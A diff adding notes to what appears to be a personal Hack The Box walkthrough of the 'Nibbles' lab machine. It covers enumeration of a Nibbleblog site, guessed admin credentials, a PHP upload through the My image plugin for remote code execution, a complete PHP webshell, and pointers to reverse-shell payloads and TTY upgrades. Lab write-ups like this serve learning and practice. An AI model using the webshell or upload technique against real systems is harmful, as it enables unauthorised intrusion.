@@ -192,3 +192,85 @@ So we can do the full HTB flow that they did in just 2 steps:
 ### Web footprinting
 
 - Analyze page source
+- Check page using cURL
+- whatweb: Use it on endpoints to get the tech stack (`whatweb http://<ip>/nibbleblog/`)
+- Search for exploits, here the program is `nibbleblog`. Searching for something like **nibbleblog exploit** on google yields an exploit. In this case, we can upload php files and execute them. We don't know the version, but it is worth trying this. The **metasploit** module for this uses user supplied credentials to exploit it.
+- Fuzzing the endpoint using any tool (I personally use dirsearch or ffuf) reveals the existence of an admin.php, 
+- In case you need to generate wordlists using a site use **CeWL**.
+- On doing some more checking around, you can also find that `/themes` has directory listing enabled. Enumerating here allows us to confirm that **admin** is a valid username.
+
+```
+NOTE: This has IP-Based blacklisting enabled, which allows the server to block our IP based on multiple login attempts, so bruteforcing is not an option here.
+```
+
+- This part is honestly just guesswork, but essentially when we look at `nibbleblog/content/private/users.xml` we see a lot of mentiones of the word nibbles (not-so-coincidentally, the name of the box). This is what CeWL can be used for as well. You can crawl the site and enable wordlist parsing.
+
+## Nibbles - Initial Foothold
+
+- So, to get the foothold here, I am gonna follow a slightly more convenient approach.
+- We already have access to the admin panel because, we figured out the admin credentials, that being `admin:nibbles`.
+- We will use this to login to the admin panel. Here we can see a couple of functions that are available. 
+
+| Page | Contents |
+| :--- | :--- |
+| **Publish** | making a new post, video post, quote post, or new page. It could be interesting. |
+| **Comments** | shows no published comments |
+| **Manage** | Allows us to manage posts, pages, and categories. We can edit and delete categories, not overly interesting. |
+| **Settings** | Scrolling to the bottom confirms that the vulnerable version 4.0.3 is in use. Several settings are available, but none seem valuable to us. |
+| **Themes** | This Allows us to install a new theme from a pre-selected list. |
+| **Plugins** | Allows us to configure, install, or uninstall plugins. The My image plugin allows us to upload an image file. Could this be abused to upload PHP code potentially? |
+
+- Now it is important to test all the funcions, check it out in burp, and analyze it. In this case, the obvious area to pay careful attention to is `plugins`.
+- Here we can see that the plugin can be a piece of PHP code or some sort of image. At first glance, there doesn't seem to be much validation, so we'll try and upload an arbitrary piece of code to test for RCE.
+
+```php
+<?php system('id'); ?>
+```
+
+- Save this to a file (here, I am calling it test.php) and upload it. cURL this endpoint (`/nibbleblog/content/private/plugins/my_image/<filename>.php`), and you will see the output for id. This shows that we have RCE.
+- We have 2 options here, either use Metasploit and get RCE or upload your own webshell. I will show you a simple webshell that I've made which allows you to run commands in the browser. Either use this or another php webshell called p0wny shell (very cool btw).
+- This is the code to my webshell:
+
+```php
+<?php
+if (isset($_POST['cmd'])) {
+    $output = shell_exec($_POST['cmd']);
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Mini WebShell</title>
+</head>
+<body>
+    <h2>PHP WebShell</h2>
+    <form method="post">
+        <input type="text" name="cmd" placeholder="Enter command" size="50">
+        <input type="submit" value="Execute">
+    </form>
+
+    <?php if (isset($output)): ?>
+        <pre><?php echo htmlspecialchars($output); ?></pre>
+    <?php endif; ?>
+</body>
+</html>
+```
+
+- From here you can run any reverse shell payload, and get a proper shell. Start a netcat listener on a port of your choice, and use a tool like [revshells](https://revshells.com) to generate a payload.
+- Once the connection is established, use any method to gain a full tty. The 2 best ones that I've seen to work are as follows.
+
+```bash
+python3 -c "import pty; pty.spawn('/bin/bash')"
+
+(if python is on the system)
+```
+
+or
+
+```bash
+script /dev/null -c /bin/bash
+```
+
+- Both of these yield full terminals. Check user.txt for the flag.
+
